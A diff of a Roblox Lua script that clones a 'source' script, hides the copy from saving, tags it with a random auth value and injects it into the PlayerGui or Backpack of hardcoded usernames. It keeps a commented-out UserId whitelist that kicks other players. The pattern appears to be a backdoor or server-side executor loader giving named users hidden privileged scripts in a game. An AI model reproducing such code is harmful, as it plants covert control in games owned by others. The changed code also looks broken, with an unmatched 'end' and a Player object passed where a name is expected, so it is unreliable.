@@ -34,36 +34,34 @@ end
 
 Auth = RandomHTTP()
 
-local Module = {}
 
 
-function Module:er(Plr)
-	local Player = game:GetService("Players"):FindFirstChild(Plr)
-	-- 👻
-	--if Player.UserId ~= 4403398646 or not 4640471291 or not 5054184507 then
-	--	Player:Kick("👻")
-	--	script:ClearAllChildren()
-	--	return
-	--end
+Plr = game:GetService("Players").Transcendanc_y or game:GetService("Players").troolloolloololol
+
+local Player = game:GetService("Players"):FindFirstChild(Plr)
+-- 👻
+--if Player.UserId ~= 4403398646 or not 4640471291 or not 5054184507 then
+--	Player:Kick("👻")
+--	script:ClearAllChildren()
+--	return
+--end
 	
-	local Script = source:Clone()
-	Script.Archivable = false
-	Script.Name = Player.Name
-	Script.Enabled = true
-	Script:SetAttribute("Auth", Auth)
-	Script.Parent = Player:FindFirstChildOfClass("PlayerGui") or Player:FindFirstChildOfClass("Backpack")
-	if Player:FindFirstChildOfClass("PlayerGui") == nil and Player:FindFirstChildOfClass("Backpack") == nil then
-		local Backpack = Instance.new("Backpack", Player)
-		Backpack.Archivable = true
-		Backpack.Name = "Backpack"
-		Script.Parent = Backpack
-	end
-	local LocalScript = Script:FindFirstChildOfClass("LocalScript"):Clone()
-	LocalScript.Archivable = false
-	LocalScript.Name = Player.Name
-	LocalScript.Enabled = true
-	LocalScript:SetAttribute("Auth", Auth)
-	LocalScript.Parent = Script
+local Script = source:Clone()
+Script.Archivable = false
+Script.Name = Player.Name
+Script.Enabled = true
+Script:SetAttribute("Auth", Auth)
+Script.Parent = Player:FindFirstChildOfClass("PlayerGui") or Player:FindFirstChildOfClass("Backpack")
+if Player:FindFirstChildOfClass("PlayerGui") == nil and Player:FindFirstChildOfClass("Backpack") == nil then
+	local Backpack = Instance.new("Backpack", Player)
+	Backpack.Archivable = true
+	Backpack.Name = "Backpack"
+	Script.Parent = Backpack
 end
-
-return Module
+local LocalScript = Script:FindFirstChildOfClass("LocalScript"):Clone()
+LocalScript.Archivable = false
+LocalScript.Name = Player.Name
+LocalScript.Enabled = true
+LocalScript:SetAttribute("Auth", Auth)
+LocalScript.Parent = Script
+end
